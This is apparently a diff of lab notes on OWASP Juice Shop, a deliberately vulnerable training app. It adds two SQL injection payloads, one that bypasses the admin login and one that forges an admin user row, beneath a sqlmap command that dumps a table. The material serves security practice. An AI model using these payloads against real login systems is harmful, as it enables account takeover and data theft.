@@ -79,3 +79,10 @@ sqlmap -r ss.req --batch --level=5 --risk=3 --ignore-code=401  -D SQLite -T Prod
         "createdAt": null,
         "updatedAt": null,
         "deletedAt": null
+
+
+
+SELECT * FROM Users WHERE email = 'admin@juice-sh.op' UNION SELECT 'acc0unt4nt@juice-sh.op',NULL-- ' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NUL
+
+
+' UNION SELECT * FROM (SELECT 123 as 'id', 'jopa' as 'username', 'acc0unt4nt@juice-sh.op' as 'email','password' as 'password', 'admin' as 'role','' as 'deluxeToken' , '0.0.0.0' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as isActive,   datetime('now') as 'createdAt', datetime('now') as 'updatedAt', NULL as 'deletedAt')-- 
